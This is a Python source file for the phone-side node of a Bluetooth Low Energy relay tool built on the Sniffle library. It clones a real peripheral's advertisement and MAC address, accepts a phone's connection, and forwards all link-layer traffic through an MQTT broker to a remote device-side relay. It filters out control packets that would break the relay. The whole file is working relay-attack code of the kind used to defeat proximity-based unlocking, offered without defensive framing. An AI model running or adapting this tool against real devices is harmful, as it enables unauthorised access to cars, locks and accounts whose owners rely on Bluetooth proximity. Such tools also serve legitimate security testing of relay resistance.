#!/usr/bin/env python3

# BLE MQTT Relay - Peripheral Side (Phone-side)
# Clones the real peripheral's advertisement and waits for the central (phone) to connect.
# Once connected, transparently forwards BLE link-layer data via MQTT.
#
# Copyright (c) 2026, oyyunshen
# Based on Sniffle by Sultan Qasim Khan (NCC Group plc), licensed under GPLv3
# Released as open source under GPLv3

"""
This script runs near the legitimate central device (e.g., a phone).
It receives advertisement data from the device-side relay via MQTT,
clones the target peripheral's identity, and forwards all BLE traffic
bidirectionally through the MQTT broker.

Architecture:
    Phone/Central <--BLE--> [This Script + Sniffle Board] <--MQTT--> [Device-side Relay]
"""

import argparse
import signal
import socket
import sys
import time
import threading
from collections import deque

from paho.mqtt import client as mqtt_client
from paho.mqtt.enums import CallbackAPIVersion

from sniffle.sniffle_hw import SniffleHW, BLE_ADV_AA, SnifferMode
from sniffle.packet_decoder import (
    PacketMessage, DPacketMessage, DataMessage, LlDataContMessage,
    ConnectIndMessage, LlControlMessage
)
from sniffle.sniffer_state import StateMessage, SnifferState
from sniffle.measurements import MeasurementMessage
from sniffle.errors import SniffleHWPacketError
from sniffle.pcap import PcapBleWriter


class RelayPeripheral:
    """Peripheral-side (phone-side) BLE relay node."""

    def __init__(self, args):
        self.args = args
        self.hw = None
        self.mqtt = None
        self.pcwriter = None

        # State
        self.adv_data = None
        self.scan_rsp_data = None
        self.adv_tx_add = False
        self.adv_mac_bytes = None
        self.got_adv = False
        self.got_rsp = False
        self.peripheral_ready = False
        self.pending_data = deque()
        self.hw_lock = threading.Lock()

    def run(self):
        """Main entry point."""
        self._check_hardware()
        self._setup_mqtt()
        self._wait_for_advertisement()
        self._setup_hardware()
        self._start_advertising()
        self._relay_loop()

    def _check_hardware(self):
        """Quick check that the Sniffle board is accessible."""
        print("[*] Checking Sniffle board...")
        try:
            hw = SniffleHW(self.args.serport)
            hw.cmd_chan_aa_phy(37, BLE_ADV_AA, 0)
            hw.ser.close()
            print("[+] Sniffle board OK")
        except Exception as e:
            print(f"[-] Sniffle board check failed: {e}")
            sys.exit(1)

    def _setup_mqtt(self):
        """Connect to MQTT broker and subscribe to the device-side topic."""
        client_id = f"relay-peripheral-{int(time.time()) % 10000}"
        self.mqtt = mqtt_client.Client(CallbackAPIVersion.VERSION2, client_id)
        self.mqtt.on_connect = self._on_connect
        self.mqtt.on_message = self._on_message

        print(f"[*] Connecting to MQTT broker {self.args.broker}:{self.args.mqtt_port}...")
        self.mqtt.connect(self.args.broker, self.args.mqtt_port)
        self.mqtt.subscribe(self.args.sub_topic)
        self.mqtt.subscribe(self.args.sub_topic + "/rsp")
        self.mqtt.loop_start()

    def _on_connect(self, client, userdata, flags, rc, properties=None):
        if rc == 0:
            print("[+] Connected to MQTT Broker")
            if client._sock is not None:
                client._sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            client.subscribe(self.args.sub_topic)
            client.subscribe(self.args.sub_topic + "/rsp")
        else:
            print(f"[-] MQTT connection failed, code: {rc}")
            sys.exit(1)

    def _on_message(self, client, userdata, msg):
        """Handle messages from the device-side relay."""
        try:
            payload = msg.payload.decode()
            msg_type = payload[:3]
            msg_data = payload[4:]

            if msg_type == "adv":
                self._handle_adv_message(msg_data)
            elif msg_type == "rsp":
                self._handle_rsp_message(msg_data)
            elif msg_type == "dat":
                self._handle_data_message(msg_data)
        except Exception as e:
            print(f"[-] Error processing MQTT message: {e}")

    def _handle_adv_message(self, data: str):
        """Parse advertisement body from device-side relay."""
        body = bytes.fromhex(data)
        self.adv_tx_add = bool(body[0] & 0x40)  # TxAdd bit from PDU header
        self.adv_mac_bytes = list(body[2:8])     # AdvA (6 bytes)
        self.adv_data = body[8:]                 # AdvData (after header + AdvA)
        self.got_adv = True
        print(f"[+] Received ADV data ({len(self.adv_data)} bytes), "
              f"MAC: {':'.join(f'{b:02X}' for b in reversed(self.adv_mac_bytes))}, "
              f"{'Random' if self.adv_tx_add else 'Public'} address")

    def _handle_rsp_message(self, data: str):
        """Parse scan response body from device-side relay."""
        body = bytes.fromhex(data)
        self.scan_rsp_data = body[8:]  # ScanRsp data (after header + AdvA)
        self.got_rsp = True
        print(f"[+] Received SCAN_RSP data ({len(self.scan_rsp_data)} bytes)")

    def _handle_data_message(self, data: str):
        """Forward data from device-side relay to BLE."""
        if self.hw is None:
            return
        if not self.peripheral_ready:
            self.pending_data.append(data)
            return
        self._forward_data(data)

    def _forward_data(self, data: str):
        """Parse and transmit a data message to BLE."""
        event_hex, body_hex = data.split(":", 1)
        body = bytes.fromhex(body_hex)
        if len(body) < 2:
            return
        event = int(event_hex, 16)
        llid = body[0] & 3
        pdu = body[2:]

        # Filter out LL control PDUs that are unsafe to relay:
        # 0x00: LL_CONNECTION_UPDATE_IND (has instant)
        # 0x01: LL_CHANNEL_MAP_IND (has instant)
        # 0x14: LL_LENGTH_REQ (DLE negotiation, would cause size mismatch)
        # 0x15: LL_LENGTH_RSP
        # 0x16: LL_PHY_REQ (PHY negotiation, would cause PHY mismatch)
        # 0x17: LL_PHY_RSP
        # 0x18: LL_PHY_UPDATE_IND (has instant)
        pkt = DPacketMessage.from_body(body, True)
        if isinstance(pkt, LlControlMessage) and pkt.opcode in [
                0x00, 0x01, 0x14, 0x15, 0x16, 0x17, 0x18]:
            if not self.args.quiet:
                print(f"  >> Filtered LL control with instant (opcode=0x{pkt.opcode:02x})")
            return

        with self.hw_lock:
            self.hw.cmd_transmit(llid, pdu)
        if not self.args.quiet:
            print(f"  >> BLE TX: LLID={llid} len={len(pdu)}")

    def _publish(self, payload: str):
        """Publish message to the device-side relay."""
        self.mqtt.publish(self.args.pub_topic, payload.encode(), qos=0)

    def _wait_for_advertisement(self):
        """Block until we receive both ADV and SCAN_RSP from device-side."""
        print("[*] Waiting for advertisement data from device-side relay...")
        while not (self.got_adv and self.got_rsp):
            time.sleep(0.01)
        print("[+] Advertisement data ready, initializing hardware...")

    def _setup_hardware(self):
        """Initialize Sniffle hardware for advertising."""
        self.hw = SniffleHW(self.args.serport)
        self.hw.cmd_chan_aa_phy(37, BLE_ADV_AA, 0)
        self.hw.cmd_pause_done(True)
        self.hw.cmd_follow(True)
        self.hw.cmd_rssi()
        self.hw.cmd_mac()
        self.hw.cmd_auxadv(False)
        self.hw.cmd_setaddr(bytes(self.adv_mac_bytes), is_random=self.adv_tx_add)
        self.hw.cmd_adv_interval(200)
        self.hw.cmd_interval_preload()
        self.hw.cmd_phy_preload()
        self.hw.mark_and_flush()

        if self.args.output:
            self.pcwriter = PcapBleWriter(self.args.output)

    def _start_advertising(self):
        """Start advertising with cloned identity."""
        self.hw.cmd_advertise(self.adv_data, self.scan_rsp_data)
        print("[+] Advertising as cloned peripheral, waiting for central to connect...")

    def _relay_loop(self):
        """Main BLE receive and forward loop."""
        while True:
            try:
                with self.hw_lock:
                    msg = self.hw.recv_and_decode()
                if isinstance(msg, PacketMessage):
                    self._process_packet(msg)
                elif isinstance(msg, StateMessage):
                    print(f"  [State] {msg}")
                elif isinstance(msg, MeasurementMessage):
                    print(f"  [Meas] {msg}")
            except SniffleHWPacketError as e:
                print(f"  [!] HW packet error: {e}")
            except KeyboardInterrupt:
                print("\n[*] Stopping...")
                break

    def _process_packet(self, pkt: PacketMessage):
        """Decode and forward BLE packet."""
        dpkt = DPacketMessage.decode(pkt)

        if isinstance(dpkt, ConnectIndMessage):
            self.hw.decoder_state.cur_aa = dpkt.aa_conn
            self.hw.decoder_state.last_chan = -1
            if dpkt.pdutype == "CONNECT_IND":
                self._publish(f"con:{dpkt.body.hex()}")
                self.peripheral_ready = True
                print(f"[+] Central connected! Forwarding CONNECT_IND to device-side")
                # Replay queued data packets
                if self.pending_data:
                    print(f"[*] Replaying {len(self.pending_data)} queued packets...")
                    while self.pending_data:
                        self._forward_data(self.pending_data.popleft())
            pdu_type = 0

        elif isinstance(dpkt, DataMessage):
            is_empty = isinstance(dpkt, LlDataContMessage) and dpkt.data_length == 0
            if not is_empty:
                payload = f"dat:{dpkt.event:04x}:{dpkt.body.hex()}"
                self._publish(payload)
                if not self.args.quiet:
                    print(f"  << BLE RX: len={dpkt.data_length} event={dpkt.event}")
            pdu_type = 3 if dpkt.data_dir else 2
        else:
            pdu_type = 0

        if self.pcwriter:
            self.pcwriter.write_packet(
                int(pkt.ts_epoch * 1000000), pkt.aa, pkt.chan,
                pkt.rssi, pkt.body, pkt.phy, pdu_type
            )


def main():
    parser = argparse.ArgumentParser(
        description="BLE MQTT Relay - Peripheral Side (runs near the phone/central)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -B mqtt.example.com -s /dev/ttyACM0
  %(prog)s -B 192.168.1.100 -P 8883 -s COM3 -o capture.pcapng
        """
    )
    parser.add_argument("-B", "--broker", required=True,
                        help="MQTT broker address (IP or hostname)")
    parser.add_argument("-P", "--mqtt-port", type=int, default=1883,
                        help="MQTT broker port (default: 1883)")
    parser.add_argument("-s", "--serport", default=None,
                        help="Sniffle serial port (auto-detect if not specified)")
    parser.add_argument("-o", "--output", default=None,
                        help="PCAP output file for traffic capture")
    parser.add_argument("-q", "--quiet", action="store_true",
                        help="Suppress per-packet output")
    parser.add_argument("--pub-topic", default="/ble_relay/to_device",
                        help="MQTT publish topic (default: /ble_relay/to_device)")
    parser.add_argument("--sub-topic", default="/ble_relay/to_phone",
                        help="MQTT subscribe topic (default: /ble_relay/to_phone)")
    args = parser.parse_args()

    relay = RelayPeripheral(args)

    def sigint_handler(sig, frame):
        print("\n[*] Interrupted, cleaning up...")
        if relay.hw:
            try:
                relay.hw.cmd_chan_aa_phy()
                relay.hw.ser.close()
            except Exception:
                pass
        if relay.mqtt:
            relay.mqtt.loop_stop()
            relay.mqtt.disconnect()
        sys.exit(0)

    signal.signal(signal.SIGINT, sigint_handler)
    relay.run()


if __name__ == "__main__":
    main()
